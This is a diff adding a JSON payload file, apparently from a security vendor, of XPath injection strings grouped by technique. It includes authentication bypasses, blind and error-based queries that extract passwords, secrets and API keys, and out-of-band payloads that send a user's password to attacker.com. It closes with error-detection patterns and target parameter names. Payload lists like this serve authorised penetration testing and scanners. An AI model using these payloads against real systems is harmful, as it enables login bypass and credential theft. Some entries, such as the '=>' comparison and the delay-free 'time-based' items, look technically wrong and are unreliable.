@@ -1,0 +1,89 @@
+{
+  "info": {
+    "name": "XPath Injection Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Comprehensive XPath injection payloads for authentication bypass, blind data extraction, and error-based attacks. 2026 updated.",
+    "category": "Injection",
+    "severity": "HIGH",
+    "owasp": "A03:2021 - Injection"
+  },
+  "payloads": {
+    "auth_bypass": [
+      {"payload": "' or '1'='1", "description": "Classic boolean bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or '1'='1' or ''='", "description": "Extended boolean bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or 1=1 or ''='", "description": "Numeric boolean bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or 'a'='a", "description": "String boolean bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or ''='", "description": "Minimal boolean bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or 'x'='x", "description": "Alternative char bypass", "encoding": "none", "target": "username"},
+      {"payload": "admin' or '1'='1", "description": "Admin prefix bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or 1=1--", "description": "SQL-style comment bypass", "encoding": "none", "target": "username"},
+      {"payload": "' or 1=1#", "description": "Hash comment bypass", "encoding": "none", "target": "username"},
+      {"payload": "1' or '1'='1'--", "description": "Numeric prefix bypass", "encoding": "none", "target": "username"}
+    ],
+    "blind_extraction": [
+      {"payload": "substring(//user[position()=1]/password,1,1)='a'", "description": "Password char extraction", "encoding": "none", "target": "username"},
+      {"payload": "string-length(//user[position()=1]/password)>5", "description": "Password length extraction", "encoding": "none", "target": "username"},
+      {"payload": "contains(//user[position()=1]/password,'admin')", "description": "Password contains check", "encoding": "none", "target": "username"},
+      {"payload": "substring(//user[position()=1]/email,1,1)='a'", "description": "Email char extraction", "encoding": "none", "target": "username"},
+      {"payload": "count(//user)", "description": "Count all users", "encoding": "none", "target": "username"},
+      {"payload": "string(//user[position()=1]/username)", "description": "Extract username", "encoding": "none", "target": "username"},
+      {"payload": "name(//user[position()=1]/*[1])", "description": "Extract field names", "encoding": "none", "target": "username"},
+      {"payload": "substring(//user[position()=1]/secret,1,1)='a'", "description": "Secret char extraction", "encoding": "none", "target": "username"},
+      {"payload": "contains(//user[1]/role,'admin')", "description": "Role detection", "encoding": "none", "target": "username"},
+      {"payload": "string-length(//user[1]/api_key)>10", "description": "API key length check", "encoding": "none", "target": "username"}
+    ],
+    "error_based": [
+      {"payload": "count(//user[password='test'])", "description": "Error via count", "encoding": "none", "target": "username"},
+      {"payload": "string-length(//user[1]/password)=", "description": "Error via string-length", "encoding": "none", "target": "username"},
+      {"payload": "floor(7.9)", "description": "Error trigger math", "encoding": "none", "target": "username"},
+      {"payload": "ceiling(7.9)", "description": "Error trigger ceiling", "encoding": "none", "target": "username"},
+      {"payload": "substring('test',1 div 0,1)", "description": "Division by zero error", "encoding": "none", "target": "username"},
+      {"payload": "string(//user[1]/password[contains(.,'test')])", "description": "Error via string", "encoding": "none", "target": "username"}
+    ],
+    "time_based": [
+      {"payload": "count(//user[password='admin'] | //user[password='root'])", "description": "Blind time extraction", "encoding": "none", "target": "username"},
+      {"payload": "substring(//user[1]/password,1,1)='a' and 'a'='b", "description": "Conditional delay", "encoding": "none", "target": "username"},
+      {"payload": "for $i in (1 to 1000) return count(//user)", "description": "XPath 2.0 loop delay", "encoding": "none", "target": "username"}
+    ],
+    "xpath_2_0_advanced": [
+      {"payload": "//user[matches(password,'^[a-z]')]", "description": "XPath 2.0 regex match", "encoding": "none", "target": "username"},
+      {"payload": "//user[password => 'a']", "description": "XPath 2.0 comparison", "encoding": "none", "target": "username"},
+      {"payload": "lower-case(substring(//user[1]/password,1,1))", "description": "XPath 2.0 case functions", "encoding": "none", "target": "username"},
+      {"payload": "upper-case(//user[1]/username)", "description": "XPath 2.0 upper case", "encoding": "none", "target": "username"},
+      {"payload": "matches(//user[1]/email,'.*@.*\\..*')", "description": "XPath 2.0 email match", "encoding": "none", "target": "username"}
+    ],
+    "xml_out_of_band": [
+      {"payload": "document('http://attacker.com/?x=',//user[1]/password)", "description": "OOB data exfiltration", "encoding": "none", "target": "username"},
+      {"payload": "doc(concat('http://attacker.com/',//user[1]/password))", "description": "OOB via concat", "encoding": "none", "target": "username"},
+      {"payload": "collection('http://attacker.com/xml')", "description": "OOB collection", "encoding": "none", "target": "username"}
+    ],
+    "node_traversal": [
+      {"payload": "//user[1]/*", "description": "All child nodes", "encoding": "none", "target": "username"},
+      {"payload": "//user[1]/node()", "description": "All nodes", "encoding": "none", "target": "username"},
+      {"payload": "/*/user/*", "description": "Recursive traversal", "encoding": "none", "target": "username"},
+      {"payload": "//user[position()=last()]", "description": "Last user", "encoding": "none", "target": "username"},
+      {"payload": "//user[position()=last()-1]", "description": "Second to last", "encoding": "none", "target": "username"}
+    ]
+  },
+  "detection_patterns": [
+    "xpath.*error",
+    "Invalid.*XPath",
+    "XPathException",
+    "XML.*exception",
+    "Invalid.*expression",
+    "xml.*parse",
+    "XSLT.*error",
+    "libxml.*error",
+    "simplexml.*error"
+  ],
+  "parameters": [
+    "search", "query", "find", "xpath", "xml", "doc", "node",
+    "element", "filter", "selector", "expression", "id", "user"
+  ],
+  "sample_xml_structure": {
+    "users": "//users/user[username/text()='X' and password/text()='Y']",
+    "all_fields": "//user[1]/*/text()",
+    "admin_check": "//user[role='admin']/username/text()"
+  }
+}
